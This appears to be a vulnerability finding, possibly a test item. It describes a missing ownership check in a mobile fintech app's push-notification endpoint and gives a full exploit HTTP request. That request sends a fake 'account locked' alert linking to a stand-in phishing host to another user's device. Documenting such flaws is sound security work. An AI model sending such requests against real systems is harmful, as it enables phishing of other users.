diagnosis: The test notification endpoint loads a device by deviceId and dispatches a push notification via Firebase Admin SDK with custom text. Because it never checks device.userId === req.session.userId, any user can send arbitrary notifications to other users' registered devices.
exploit_request:
POST /api/devices/dev_victim_phone_9921/send-test-alert HTTP/1.1
Host: app.fintechmobile.com
Cookie: session=<user_cookie>
Content-Type: application/json

{"title": "Security Alert", "message": "Your account has been locked. Click http://evil-phish.com to unlock"}
